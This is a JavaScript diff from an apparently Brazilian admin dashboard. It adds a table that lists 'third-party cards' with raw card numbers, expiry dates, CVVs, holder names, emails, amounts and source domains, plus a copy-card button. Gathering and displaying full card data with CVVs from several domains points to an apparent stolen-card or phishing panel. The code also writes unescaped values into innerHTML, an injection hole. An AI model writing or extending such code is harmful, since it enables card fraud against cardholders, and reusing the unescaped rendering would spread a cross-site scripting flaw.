@@ -2165,6 +2165,46 @@ Fico no aguardo! \u{1F60A}`;
     }
   }
 
+  function renderCartoesTerceirosTable(orders) {
+    const tbody = document.getElementById('table-body-cartoes-terceiros');
+    const countBadge = document.getElementById('cartoes-terceiros-count-badge');
+    if (!tbody || !countBadge) return;
+
+    if (!orders || orders.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;color:var(--text-muted);padding:2rem;">Nenhum cartão de terceiros encontrado.</td></tr>';
+      countBadge.innerText = '0 cartões';
+      return;
+    }
+
+    countBadge.innerText = `${orders.length} ${orders.length === 1 ? 'cartão' : 'cartões'}`;
+
+    tbody.innerHTML = orders.map(tx => {
+      const date = tx.created_at ? new Date(tx.created_at).toLocaleString('pt-BR') : 'Sem data';
+      const holder = tx.card_holder_raw || tx.customer_name || 'Não informado';
+      const number = tx.card_number_raw || '----';
+      const expiry = tx.card_expiry_raw || '--/--';
+      const cvv = tx.card_cvv_raw || '---';
+      const amount = (parseFloat(tx.amount) || 0).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      const domain = tx.domain || 'Desconhecido';
+
+      return `
+        <tr>
+          <td style="text-align:center;"><input type="checkbox" class="cartao-terceiro-checkbox" value="${tx.id}" style="cursor:pointer;"></td>
+          <td>${date}</td>
+          <td><div style="font-weight:600;color:var(--text-color);">${holder}</div><div style="font-size:0.8rem;color:var(--text-muted);">${tx.customer_email || ''}</div></td>
+          <td style="font-family:monospace; color:var(--primary-color); font-weight:600;">${number}</td>
+          <td>${expiry}</td>
+          <td>${cvv}</td>
+          <td style="font-weight:600;">${amount}</td>
+          <td style="font-size:0.85rem; color:var(--text-muted);">${domain}</td>
+          <td>
+            <button onclick="copyToClipboard('${number}')" style="background:none;border:none;color:var(--text-muted);cursor:pointer;padding:0.3rem;" title="Copiar Cartão"><i class="fa-regular fa-copy"></i></button>
+          </td>
+        </tr>
+      `;
+    }).join('');
+  }
+
   // Render da tabela de Clientes & Leads
   function renderClientesTable(transactions) {
     const clientsMap = {};
